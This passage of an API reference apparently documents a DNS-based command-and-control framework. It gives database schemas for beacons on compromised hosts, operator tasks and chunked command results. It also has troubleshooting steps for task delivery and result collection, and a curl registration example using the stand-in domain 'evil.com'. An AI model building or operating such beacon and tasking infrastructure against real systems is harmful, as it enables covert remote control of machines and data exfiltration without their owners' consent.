    id TEXT PRIMARY KEY,
    hostname TEXT,
    username TEXT,
    os TEXT,
    arch TEXT,
    ip_address TEXT,
    dns_server_id TEXT,
    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (dns_server_id) REFERENCES dns_servers(id)
);
```

#### `beacon_dns_contacts`

```sql
CREATE TABLE beacon_dns_contacts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    beacon_id TEXT NOT NULL,
    dns_server_id TEXT NOT NULL,
    dns_domain TEXT NOT NULL,
    first_contact TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_contact TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    contact_count INTEGER DEFAULT 1,
    FOREIGN KEY (beacon_id) REFERENCES beacons(id),
    FOREIGN KEY (dns_server_id) REFERENCES dns_servers(id),
    UNIQUE(beacon_id, dns_server_id)
);
```

#### `tasks`

```sql
CREATE TABLE tasks (
    id TEXT PRIMARY KEY,
    beacon_id TEXT NOT NULL,
    command TEXT NOT NULL,
    operator_id TEXT,
    status TEXT DEFAULT 'pending',
    result TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    completed_at TIMESTAMP,
    synced BOOLEAN DEFAULT FALSE,
    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
);
```

#### `result_chunks`

```sql
CREATE TABLE result_chunks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    task_id TEXT NOT NULL,
    chunk_index INTEGER NOT NULL,
    total_chunks INTEGER NOT NULL,
    data TEXT NOT NULL,
    received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (task_id) REFERENCES tasks(id),
    UNIQUE(task_id, chunk_index)
);
```

---

## Troubleshooting

### DNS Server Not Registering

**Symptom:** DNS server starts but Master returns 401 Unauthorized

**Diagnosis:**
```bash
# Check if X-DNS-Server-ID header is set
# In MasterClient, verify line:
req.Header.Set("X-DNS-Server-ID", mc.serverID)

# Check if server_id in body matches header
curl -X POST https://master/api/dns-server/register \
  -H "X-DNS-Server-ID: srv-1" \
  -d '{"server_id": "srv-1", "domain": "evil.com", "api_key": "key123"}'
```

**Solution:** Fixed in commit - ensure MasterClient sets header in `doRequest()`

### Beacons Not Receiving Tasks

**Symptom:** Tasks created in UI but beacon never executes them

**Diagnosis:**
```sql
-- Check if task was created
SELECT * FROM tasks WHERE beacon_id = 'beacon-abc-123';

-- Check if DNS server polled for tasks
SELECT * FROM dns_servers WHERE id = (
  SELECT dns_server_id FROM beacons WHERE id = 'beacon-abc-123'
);

-- Check last_heartbeat - should be recent
-- Check if task status = 'sent' (means DNS server received it)
```

**Common Causes:**
1. DNS server not polling (`/api/dns-server/tasks`)
2. Beacon registered to wrong DNS server
3. Task status stuck in 'sent' but beacon hasn't checked in
4. Network issues between beacon and DNS server

### Task Results Not Appearing

**Symptom:** Beacon executes task but result doesn't show in UI

**Diagnosis:**
```sql
-- Check result_chunks table
SELECT * FROM result_chunks WHERE task_id = 'task-uuid-1';

-- Check if all chunks received
SELECT COUNT(*) as received, MAX(total_chunks) as expected
FROM result_chunks WHERE task_id = 'task-uuid-1';

-- Check task status
SELECT status, result FROM tasks WHERE id = 'task-uuid-1';
```

**Common Causes:**
1. Not all result chunks received (check `received` vs `expected`)
2. Chunk reassembly failed (check Master logs for errors)
3. DNS server not submitting results (`/api/dns-server/result`)
4. Task status never updated to 'completed'

### Domain Updates Not Propagating

**Symptom:** New DNS server joins but existing servers don't get updated domain list

**Diagnosis:**
```sql
-- Check domain_update_queue
SELECT * FROM domain_update_queue WHERE status = 'pending';

-- Check first checkin detection
SELECT id, domain, last_heartbeat, registered_at
FROM dns_servers
WHERE id = 'new-server-id';

-- Verify QueueDomainUpdate was called
-- (check Master logs for "Queued domain updates for N DNS servers")
```

**Expected Flow:**
1. New server registers → `registered_at` set
2. New server first checkin → `last_heartbeat` updated, `isFirstCheckin = true`
3. Master queues domain updates for servers with active beacons
4. Existing servers receive updates on next checkin

---

## Summary

This API reference documents all 12 DNS Server API endpoints with complete:

✅ Request/response schemas  
✅ Authentication flow diagrams  
✅ Database operation details  
✅ Complete lifecycle flow diagrams  
✅ Error handling and retry policies  
✅ Rate limiting configuration  
✅ Troubleshooting guides  

**Critical Fix Applied:** `X-DNS-Server-ID` header now set in all MasterClient requests.

**All APIs Verified:** Registration, Check-in, Beacon Report, Task Distribution, Result Submission, Progress Tracking, Status Sync, Beacon Sync, and Stager APIs.

**Production Status:** Ready for deployment.
